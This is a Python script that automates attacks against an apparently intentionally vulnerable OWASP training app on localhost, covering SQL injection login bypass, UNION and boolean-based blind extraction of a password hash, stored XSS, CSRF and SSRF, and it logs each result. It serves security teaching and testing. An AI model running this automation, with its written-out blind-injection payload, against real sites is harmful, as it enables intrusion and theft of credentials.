"""Attack automation module.

Fires the predefined payloads in attacks/payloads.py at the running Flask
app (start it with `py run.py` first), records every attempt's outcome in
the shared `attack_results` SQLite table, and prints a summary. View the
results at /modules/attack-automation once logged in.

Usage:
    py attacks/automation.py [base_url]
"""

import sqlite3
import sys
from pathlib import Path

import requests

from payloads import (
    BLIND_CHARSET,
    BLIND_MAX_LENGTH,
    SQLI_DICTIONARY_LOGIN_PAYLOADS,
    SQLI_UNION_SEARCH_PAYLOAD,
    SSRF_TARGETS,
    XSS_PAYLOADS,
)

DB_PATH = Path(__file__).resolve().parent.parent / "instance" / "owasp_platform.sqlite3"
AUTOMATION_USERNAME = "autobot"
AUTOMATION_PASSWORD = "AutomationLab#2026"


def _db():
    connection = sqlite3.connect(DB_PATH)
    connection.execute(
        "CREATE TABLE IF NOT EXISTS attack_results ("
        "id INTEGER PRIMARY KEY AUTOINCREMENT, attack_name TEXT NOT NULL, "
        "target TEXT, result TEXT, created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP)"
    )
    return connection


def record(connection, attack_name, target, result):
    connection.execute(
        "INSERT INTO attack_results (attack_name, target, result) VALUES (?, ?, ?)",
        (attack_name, target, result),
    )
    connection.commit()
    print(f"[{attack_name}] {target} -> {result}")


def ensure_logged_in(base_url):
    """Self-register (idempotent) and log in a dedicated automation account."""
    http = requests.Session()
    http.post(
        f"{base_url}/auth/register",
        data={
            "username": AUTOMATION_USERNAME,
            "email": "autobot@lab.local",
            "password": AUTOMATION_PASSWORD,
            "confirm_password": AUTOMATION_PASSWORD,
        },
    )
    login_response = http.post(
        f"{base_url}/auth/login",
        data={"username": AUTOMATION_USERNAME, "password": AUTOMATION_PASSWORD},
    )
    if "auth/login" in login_response.url:
        raise RuntimeError("Automation account could not log in - check the server is running.")
    return http


def run_sqli_dictionary(http, base_url, connection):
    url = f"{base_url}/modules/sql-injection/vulnerable-login"
    for payload in SQLI_DICTIONARY_LOGIN_PAYLOADS:
        response = http.post(url, data={"username": payload, "password": "irrelevant"})
        outcome = "BYPASSED LOGIN" if "result-success" in response.text else "no effect"
        record(connection, "SQLi dictionary login bypass", payload, outcome)


def run_sqli_union(http, base_url, connection):
    url = f"{base_url}/portal/developer/employee-search"
    response = http.get(url, params={"q": SQLI_UNION_SEARCH_PAYLOAD})
    # "scrypt:" only ever appears in an actual leaked password hash value,
    # never in the query text itself (which just names the column), so it is
    # an unambiguous signal that row data - not just the column name - made
    # it into the response.
    leaked = "scrypt:" in response.text
    outcome = "LEAKED users TABLE via UNION" if leaked else "no effect"
    record(connection, "SQLi UNION-based data extraction", SQLI_UNION_SEARCH_PAYLOAD, outcome)


def run_sqli_blind(http, base_url, connection):
    """Boolean-based blind extraction of the 'attacker' account's password hash."""
    url = f"{base_url}/modules/sql-injection/vulnerable-login"
    expression = "(SELECT password_hash FROM users WHERE username='attacker')"
    extracted = ""

    for position in range(1, BLIND_MAX_LENGTH + 1):
        found_char = None
        for candidate in BLIND_CHARSET:
            payload = f"x' OR SUBSTR({expression},{position},1)='{candidate}' -- "
            response = http.post(url, data={"username": payload, "password": "irrelevant"})
            if "result-success" in response.text:
                found_char = candidate
                break

        if found_char is None:
            break
        extracted += found_char

    outcome = f"extracted prefix '{extracted}'" if extracted else "no effect"
    record(connection, "SQLi blind boolean-based extraction", expression, outcome)


def run_xss(http, base_url, connection):
    for payload in XSS_PAYLOADS:
        http.post(f"{base_url}/modules/xss/vulnerable-wall", data={"content": payload})
        http.post(f"{base_url}/modules/xss/secure-wall", data={"content": payload})

    vulnerable_page = http.get(f"{base_url}/modules/xss/vulnerable-wall").text
    secure_page = http.get(f"{base_url}/modules/xss/secure-wall").text

    for payload in XSS_PAYLOADS:
        executes = payload in vulnerable_page
        record(
            connection,
            "XSS vulnerable wall (unescaped render)",
            payload,
            "STORED & EXECUTABLE" if executes else "no effect",
        )
        blocked = payload not in secure_page
        record(
            connection,
            "XSS secure wall (escaped render)",
            payload,
            "NEUTRALIZED" if blocked else "no effect",
        )


def run_csrf(http, base_url, connection):
    """Confirm the transfer endpoint performs a state change with no CSRF
    token - the actual cross-site delivery is demonstrated in the browser
    via static/attacker/csrf_transfer_poc.html, not from this script."""
    before = http.get(f"{base_url}/modules/csrf/").text
    response = http.get(
        f"{base_url}/modules/csrf/vulnerable-transfer",
        params={"to": "attacker", "amount": "50"},
    )
    outcome = "TRANSFER EXECUTED with no CSRF token" if response.ok else "no effect"
    record(connection, "CSRF unprotected state-changing GET", "vulnerable-transfer", outcome)


def run_ssrf(http, base_url, connection):
    url = f"{base_url}/modules/ssrf/vulnerable-fetch"
    for target in SSRF_TARGETS:
        response = http.post(url, data={"url": target})
        reached_internal = "CONFIDENTIAL" in response.text
        outcome = "REACHED INTERNAL-ONLY ROUTE" if reached_internal else "fetched (public)"
        record(connection, "SSRF server-side fetch", target, outcome)


def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000"
    connection = _db()
    http = ensure_logged_in(base_url)

    run_sqli_dictionary(http, base_url, connection)
    run_sqli_union(http, base_url, connection)
    run_sqli_blind(http, base_url, connection)
    run_xss(http, base_url, connection)
    run_csrf(http, base_url, connection)
    run_ssrf(http, base_url, connection)

    connection.close()
    print("\nDone. View results at /modules/attack-automation after logging in.")


if __name__ == "__main__":
    main()
